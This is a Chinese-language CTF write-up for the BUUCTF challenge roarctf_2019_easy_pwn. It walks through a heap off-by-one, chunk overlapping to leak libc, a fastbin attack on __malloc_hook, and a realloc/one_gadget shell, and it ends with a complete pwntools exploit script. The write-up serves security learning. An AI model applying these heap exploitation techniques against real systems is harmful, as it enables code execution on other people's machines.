---
title: "BUUCTF Pwn Roarctf_2019_easy_pwn"
date: 2020-04-23T18:05:59+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Roarctf_2019_easy_pwn

考点：

1、heap off-by-one

2、chunk extend overlapping

3、fast bin attack

4、use one_gadget

大致功能是添加、编辑、显示、删除，明显的堆题

![image-20200424162416907](/images/image-20200424162416907.png)

漏洞点：delete中无UAF，关键漏洞在edit中

![image-20200424162627034](/images/image-20200424162627034.png)

sub_E26中

![image-20200424162700811](/images/image-20200424162700811.png)

在执行edit的时候要求输入一个size，这个size会与add的时候输入的size作比较，满足edit输入的size减去add输入的size为10，则将我们接下来能够输入的数据+1字节，从而触发off-by-one漏洞

利用off-by-one漏洞可以执行chunk extend overlapping漏洞，结合unsorted bin的机制可以leak出libc中的main_arena地址，利用leak出的地址来计算偏移libc

## 1、利用off-by-one+chunk overlapping来leak出libc地址

1、add4个chunk

![image-20200424163729804](/images/image-20200424163729804.png)

2、执行off-by-one，从chunk0溢出\x91到chunk1

![image-20200424163755441](/images/image-20200424163755441.png)

3、free掉chunk1来切割unsorted bin也就是我们伪造的0x90大小的chunk

![image-20200424163826669](/images/image-20200424163826669.png)

4、add chunk1原本的大小56字节=0x38<=0x40(chunk自动对齐)

![image-20200424164132983](/images/image-20200424164132983.png)

需要leak的地址就落在chunk2中了，因为chunk2并没有free所以直接show chunk2可以leak出地址

在leak步骤中需要修改的chunk1的size字段的值要满足unsorted bin也就是说要大于fastbin的0x80，然后free就会将这个满足的chunk块写入unsorted bin中

才会在下一个chunk中的fd和bk中泄露出libc的main_arena地址，因为

1、释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中

2、当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE（0x20），就会被放到 unsorted bin 中

## 2、利用chunk overlapping+fastbin attach来迁移chunk

主要利用chunk中的fd字段来迁移chunk到malloc_hook附件，使我们下次add的chunk就是在malloc_hook附近然后edit这个chunk来修改内容(指针)

![image-20200423231821108](/images/image-20200423231821108.png)

下图就是修改后的fd字段指向malloc_hook附近，然后add得到这里的内存空间作为chunk

![image-20200423233346236](/images/image-20200423233346236.png)

![image-20200423234011071](/images/image-20200423234011071.png)

然后利用edit来修改chunk也就是修改malloc_hook和realloc_hook(他们俩相邻)

## 3、利用伪造的chunk来修改malloc_hook和realloc_hook

注意：

这里利用的one_gadget条件无法达成，所以需要利用realloc来调整rsp的值来达成getshell的条件

https://blog.csdn.net/Maxmalloc/article/details/102535427

![image-20200424181802458](/images/image-20200424181802458.png)

修改__malloc_hook指向realloc，然后修改\_\_realloc\_hook来指向one_gedget，最后执行一次add就会执行calloc->malloc_hook->realloc->realloc\_hook->one\_gadget->execve("/bin/sh\")

![image-20200424173821065](/images/image-20200424173821065.png)

exp

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import * 

context.log_level = 'debug'
p = process('./roarctf_2019_easy_pwn_noalarm')
#p = remote('node3.buuoj.cn',25289)
libc = ELF('./x64_ubuntu16_libc-2.23.so')

def add(size):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("size:")
    p.sendline(str(size))

def edit(idx,size,content):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline(str(idx))
    p.recvuntil("size:")
    p.sendline(str(size))
    p.recvuntil("content: ")
    p.sendline(content)

def delete(idx):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("index: ")
    p.sendline(str(idx))

def show(idx):
    p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil("index: ")
    p.sendline(str(idx))
    
#chunk extend overlapping leak_addr
add(24) #0
add(24) #1
add(56) #2
add(34) #3
add(56) #4
#gdb.attach(p)
edit(0,34,'a'*24 + '\x91')
#gdb.attach(p)
delete(1)
#gdb.attach(p)
add(56) #1
#gdb.attach(p)
show(2)
leak_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
print  "leak_addr:" + hex(leak_addr)

#compute libc_fun_offset
#泄露的是main_arena+88处的偏移，所以要减去libc中到main_arena+0x58的偏移才能算出基址
#可以使用GitHub上main_arena_offset这个小脚本来获取libc中main_arena的偏移
libc_base = leak_addr - (0x3c4b20 + 0x58)
malloc_hook_fkchunk = libc_base + libc.symbols['__malloc_hook'] - 0x23
realloc_hook = libc_base + libc.symbols['__realloc_hook']
realloc = libc_base + libc.symbols['__libc_realloc']
one_gadget = libc_base + 0x4526a
print "malloc_hook_fkchunk" + hex(malloc_hook_fkchunk)
print "realloc_hook:" + hex(realloc_hook)
print "realloc:" + hex(realloc)
print "one_addr:" + hex(one_gadget)

#chunk extend overlapping getshell by one_gadget
add(56)#5
add(24)#6
add(24)#7
add(90)#8
add(90)#9
add(24)#10

edit(6,34,'a'*24+'\x91')
delete(7)
#gdb.attach(p)
delete(8)
#gdb.attach(p)
add(110)#7
edit(7,120,'a'*0x10 + '\x00'*8 + '\x71' + '\x00'*7 + p64(malloc_hook_fkchunk) + '\x00'*70)
#gdb.attach(p)
add(90)
#gdb.attach(p)
add(90)#11
#gdb.attach(p)
#利用realloc调整rsp
edit(11,100,'a'*0x3 + p64(0) + p64(one_gadget) + p64(realloc+2) + '\x00'*63)

#gdb.attach(p)
p.recvuntil("choice:")
p.sendline("1")
p.recvuntil("size:")
#gdb.attach(p)
p.sendline(str(90))
#gdb.attach(p)
p.sendline('cat flag')
p.interactive()
```

